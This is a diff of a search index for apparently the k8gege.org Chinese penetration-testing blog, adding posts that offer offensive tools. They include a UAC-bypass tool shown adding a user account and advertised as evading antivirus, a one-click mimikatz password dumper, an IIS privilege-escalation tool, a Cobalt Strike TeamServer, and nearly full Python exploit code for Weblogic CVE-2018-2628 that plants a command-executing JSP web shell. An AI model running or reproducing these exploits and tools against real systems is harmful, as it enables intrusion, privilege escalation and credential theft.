@@ -1287,6 +1287,43 @@
       </tags>
   </entry>
   <entry>
+    <title>Ladon高效率子域名扫描GUI版</title>
+    <url>/p/LadonSubDomain.html</url>
+    <content><![CDATA[<p style="color:#fff;"> 
+<% <span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+
+%>
+</%></p>
+
+
+
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/PowershellEncode.html";
+</script>
+
+<h3 id="更新功能"><a href="#更新功能" class="headerlink" title="更新功能"></a>更新功能</h3><p>GUI 2020.11.2<br>[+] SubDomain 高效率子域名扫描（3万字典）<br>[+] OnlinePC  本地存活主机、操作系统探测</p>
+<h3 id="GUI子域名扫描"><a href="#GUI子域名扫描" class="headerlink" title="GUI子域名扫描"></a>GUI子域名扫描</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/gui/SubDomain.PNG"></p>
+<h3 id="本地存活主机探测"><a href="#本地存活主机探测" class="headerlink" title="本地存活主机探测"></a>本地存活主机探测</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/gui/OnlinePC.png"></p>
+<h3 id="CMD子域名扫描"><a href="#CMD子域名扫描" class="headerlink" title="CMD子域名扫描"></a>CMD子域名扫描</h3><p>Example: Ladon baidu.com SubDomain<br><br>需域名字典SubDomain.dic，字典上万个高效率子域名<br></p>
+<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
+<p>与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br><br>作者说它的工具携带字典包含2000个常用子域名<br><br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br><br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
+<p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br><br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br><br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br><br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p>
+<p>后期可能会添加证书或其它站点查询子域名(K8C段工具曾经添加过证书查询域名功能)</p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+        <category>PowerShell</category>
+      </categories>
+      <tags>
+        <tag>PowerShell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ladon免杀/.NET免杀/Exe2Ps1/Ps12Exe</title>
     <url>/p/Exe2Powershell.html</url>
     <content><![CDATA[<p style="color:#fff;"> 
@@ -1972,11 +2009,11 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <categories>
         <category>Ladon</category>
         <category>.NET</category>
-        <category>主机发现</category>
         <category>源码</category>
+        <category>主机发现</category>
         <category>内网渗透</category>
-        <category>信息收集</category>
         <category>编程</category>
+        <category>信息收集</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -2172,8 +2209,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>远程执行</category>
         <category>内网渗透</category>
+        <category>远程执行</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -3659,6 +3696,26 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       </tags>
   </entry>
   <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0803提权工具</title>
     <url>/p/fa25cc9b.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x000 漏洞信息</strong></span><br>CVE-2019-0803 | Win32k 特权提升漏洞<br>发布时间: 2019-04-09<br>当 Win32k 组件无法正确处理内存中的对象时，Windows 中存在特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式中运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。<br>若要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
@@ -3719,33 +3776,13 @@ Microsoft Windows 10 for 32-bit Systems 0
 
 <pre><code>&lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;</code></pre></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>工具</category>
+        <category>提权</category>
       </categories>
       <tags>
         <tag>Exp</tag>
         <tag>Tool</tag>
         <tag>LPE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
       </tags>
   </entry>
   <entry>
@@ -3767,8 +3804,8 @@ Microsoft Windows 10 for 32-bit Systems 0
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Metasploit</category>
         <category>Cobalt Strike</category>
+        <category>Metasploit</category>
         <category>ShellCode</category>
       </categories>
       <tags>
@@ -3910,8 +3947,8 @@ Microsoft Windows 10 for 32-bit Systems 0
         <category>工具</category>
         <category>Ladon</category>
         <category>源码</category>
-        <category>Python</category>
         <category>编程</category>
+        <category>Python</category>
       </categories>
       <tags>
         <tag>Ladon</tag>
@@ -4061,8 +4098,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Metasploit</category>
         <category>Cobalt Strike</category>
+        <category>Metasploit</category>
         <category>ShellCode</category>
         <category>Python</category>
       </categories>
@@ -4197,6 +4234,205 @@ payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x
         <tag>Tool</tag>
         <tag>Code</tag>
         <tag>GetShell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</title>
+    <url>/p/41e1c61c.html</url>
+    <content><![CDATA[<p>[原创]K8uac bypassUAC(Win7/Wi8/Win10) 过46款杀软影响所有Windows版本</p>
+<p>工具: k8uac<br>编译: VC++</p>
+<p>作者:K8哥哥<br>发布:&nbsp;2018/11/25 1:30</p>
+<p>这是一个旧方法，近两年很多APT都有在使用，前几天测试发现依然可用。</p>
+<p>不但支持全系统而且还免杀,你让我上哪说理去。</p>
+<p>免杀报告:<a href="http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6" target="_blank">http://r.virscan.org/language/en/report/2b1a19189b37d4f605b564c4e71227f6</a></p>
+<p>示例如下:</p>
+<p>C:\Users\K8team\Desktop&gt;k8uac<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>useage:k8uac cmdline<br><br>C:\Users\K8team\Desktop&gt;k8uac "net user k8test k8test /add"<br>BypassUAC (Win7/Win8/Win10) by K8哥哥<br>success!<br>0操作成功完成。</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/k8uac.png"></p>
+<p>&nbsp;下载：<a href="https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar" target="_blank">https://files.cnblogs.com/files/k8gege/k8uac_20181125%5BK8%5D.rar</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>BypassUAC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mimikatz 2.1.1一键版 &amp; PowerShell</title>
+    <url>/p/77429fa6.html</url>
+    <content><![CDATA[<p>无需任何参数,运行EXE即可自动读取Windows系统密码</p>
+<p>EXE版需要其它功能请使用原版 (参数已写死仅读密码)</p>
+<p>结果保存于当前目录mz.log</p>
+<p>EXE</p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/mz.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz.exe</a></p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/mz64.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/mz64.exe</a></p>
+<p>PowerShell</p>
+<p><a href="https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1" target="_blank">https://github.com/k8gege/K8tools/blob/master/Invoke-Mimikatz.ps1</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>提权</category>
+        <category>密码</category>
+        <category>PowerShell</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>PowerShell</tag>
+        <tag>mimikatz</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
+    <url>/p/b8e58f69.html</url>
+    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
+<hr>
+<ul>
+<li>漏洞威胁：RCE--远程代码执行</li>
+<li>漏洞组件：weblogic</li>
+<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
+</ul>
+<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
+<div class="cnblogs_Highlighter">
+<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
+# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
+
+<p>from <strong>future</strong> import print_function</p>
+<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
+<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
+<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
+return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
+<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
+<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
+<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
+<pre><code>rs=send_payload_objdata(sock, payload)
+#print(&apos;response: &apos; + rs)
+print(&apos;exploit completed!&apos;)
+print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
+print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
+<pre><code>dip = sys.argv[1]
+dport = int(sys.argv[2])
+exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
+</div>
+<h2>&nbsp;演示:</h2>
+<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
+<h2>附件说明:</h2>
+<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
+<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
+<p>&nbsp;</p>]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>GetShell</tag>
+        <tag>Weblogic</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于Browser协议探测内网主机</title>
+    <url>/p/16b5ff0b.html</url>
+    <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
+<div class="para">
+<h3 class="title-text"><img alt data-original="http://k8gege.org/k8img/posts/browser1.png"></h3>
+</div>
+<div class="para">
+<h3 class="title-text">浏览</h3>
+<div class="para">在SMB协议中，计算机为了访问<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E8%B5%84%E6%BA%90" target="_blank">网络资源</a>，就需要了解网络上存在的资源列表（例如在Windows下使用网络邻居查看可以访问的计算机），这个机制就被称为浏览（Browsing）。虽然SMB协议中经常使用广播的方式，但如果每次都使用广播的方式了解当前的网络资源（包括提供服务的计算机和各个计算机上的服务资源），就需要消耗大量的网络资源和浪费较长的查找时间，因此最好在网络中维护一个网络资源的列表，以方便查找网络资源。只有必要的时候，才重新查找资源，例如使用Windows下的查找计算机<a href="https://baike.baidu.com/item/%E5%8A%9F%E8%83%BD" target="_blank">功能</a>。</div>
+</div>
+<div class="para">但没有必要每个计算机都维护整个资源列表，维护网络中当前资源列表的任务由网络上的几个特殊计算机完成的，这些计算机被称为Browser，这些Browser通过记录广播数据或查询名字服务器来记录网络上的各种资源。</div>
+<div class="para">Browser并不是事先指定的计算机，而是在普通计算机之间通过自动进行的推举产生的。不同的计算机可以按照其提供服务的能力，设置在推举时具备的不同权重。为了保证一个Browser停机时网络浏览仍然正常，网络中常常存在多个Browser，一个为主Browser（Master Browser），其他的为备份Browser。</div>
+<div class="anchor-list"><a class="lemma-anchor para-title" name="2_2"></a> <a class="lemma-anchor " name="sub3004457_2_2"></a> <a class="lemma-anchor " name="工作组和域"></a> <a class="lemma-anchor " name="2-2"></a></div>
+<div class="para-title level-3">
+<h3 class="title-text">工作组和域</h3>
+</div>
+<div class="para">工作组和域这两个概念在进行浏览时具备同样的用处，都是用于区分并维护同一组浏览数据的多个计算机。事实上他们的不同在于认证方式上，工作组中每台计算机都基本上是独立的，独立对客户访问进行认证，而域中将存在一个（或几个）<a href="https://baike.baidu.com/item/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">域控制器</a>，保存对整个域中都有效的认证信息，包括用户的认证信息以及域内成员计算机的认证信息。浏览数据的时候，并不需要认证信息，Microsoft将工作组扩展为域，只是为了形成一种分级的目录结构，将原有的浏览和<a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1" target="_blank">目录服务</a>相结合，以扩大Mircrosoft网络服务范围的一种策略。 　工作组和域都可以跨越多个子网，因此网络中就存在两种Browser，一种为Domain Master Browser ，用于维护整个工作组或域内的浏览数据，另一种为Local Master Browser，用于维护本子网内的浏览<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE/33305" target="_blank" data-lemmaid="33305">数据</a>，它和Domain Master Browser通信以获得所有的可浏览数据。划分这两种Browser 主要是由于浏览数据依赖于本地网广播来获得资源列表，不同子网之间只能通过浏览器之间的交流能力，才能互相交换资源列表。</div>
+<div class="para">但是，为了浏览多个子网的资源，必须使用NBNS名字服务器的解析方式，没有NBNS的帮助，计算机将不能获得子网外计算机的NetBIOS名字。Local Master Browser也需要查询NetBIOS名字服务器以获得Domain Master Browser的名字，以相互交换网络资源信息。</div>
+<div class="para">由于<a href="https://baike.baidu.com/item/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">域控制器</a>在域内的特殊性，因此域控制器倾向于被用做Browser，<a href="https://baike.baidu.com/item/%E4%B8%BB%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8" target="_blank">主域控制器</a>应该被用作Domain Master Browser，他们在推举时设置的权重较大。</div>
+<p><span style="font-size: 14px;"><strong>Browser发包时间</strong></span></p>
+<p>去年无意发现browser协议中含有机器名、系统版本,发包时间随机，有些2分钟、5分钟、甚至12分钟等才发</p>
+<p>几分钟甚至于10几分钟才有一条，其它数据包每分钟几百条，可能很多人长时间抓包，也未能发现关键信息</p>
+<p>不单只是很长时间才发，而且也不一定每个包里面都含有机器名，或许这就是一直以来把Browser忽略的真相</p>
+<p>如图所示，出现13机器ID为6247数据包，出现15机器已达到2万多，出现10机器已7万多个包(这鬼才能发现)</p>
+<p>所以为了能够获取到内网机器信息，我们需要不停的监视Browser包，从中提取有效机器名与系统版本</p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/browser2.png"></p>
+<p>&nbsp;<strong>无视防火墙</strong></p>
+<p>虽然属于SMB协议，但把文件和共享前的勾去掉依旧可获取,该报文是由目标机器向外发送，所以445关闭也不影响</p>
+<p>在目标开启防火墙的情况下也可获取,这与cping通过445端口或ICMP探测主机方式不一样。<br>另外发现NBNS也含有机器名和域名,但无系统版本,如下图<img alt data-original="http://k8gege.org/k8img/posts/browser3.png"></p>
+<p><span style="font-size: 16px;"><strong>操作系统、域机器判断</strong></span></p>
+<p>除了XP和WIN8.1特别一点以外，其它系统</p>
+<p>0x00000002 Request XP名称第3位开始&nbsp; Win8.1也是 无法判断系统版本<br>0x0000000c Domain &nbsp;<span style="color: #ff00ff;">域内机器</span><br>其它 of o1 local<br><br>by K8哥哥 2018.11.26</p>
+<p><span style="font-size: 16px;"><strong>&nbsp;<span style="color: #000000;">利用代码</span></strong></span></p>
+<p>暂时没时间用其它语言编写,先用python的scapy框架来实现,如果要编译成可执行文件可能会很大,可能还要安装相关依赖</p>
+<p>&nbsp;</p>
